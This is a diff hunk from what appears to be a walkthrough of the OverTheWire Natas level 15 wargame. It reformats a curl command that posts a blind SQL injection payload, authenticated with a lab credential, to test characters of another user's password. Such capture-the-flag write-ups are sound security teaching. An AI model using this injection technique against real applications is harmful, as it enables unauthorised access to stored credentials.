@@ -16,8 +16,7 @@ form data will likely be useful for other labs and projects. Here is an example
 curl command that uses sql injection for this lab, to check if the letter a
 exists in the password for the user named natas16:
 
-curl -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J -d 'username=" OR password LIKE
-BINARY "%a%' http://natas15.natas.labs.overthewire.org/index.php
+curl -u natas15:AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J -d 'username=" OR password LIKE BINARY "%a%' http://natas15.natas.labs.overthewire.org/index.php
 
 The first two arguments tell curl what username and password to use at the
 password popup screen that appears when you first visit the lab. The 3rd and 4th
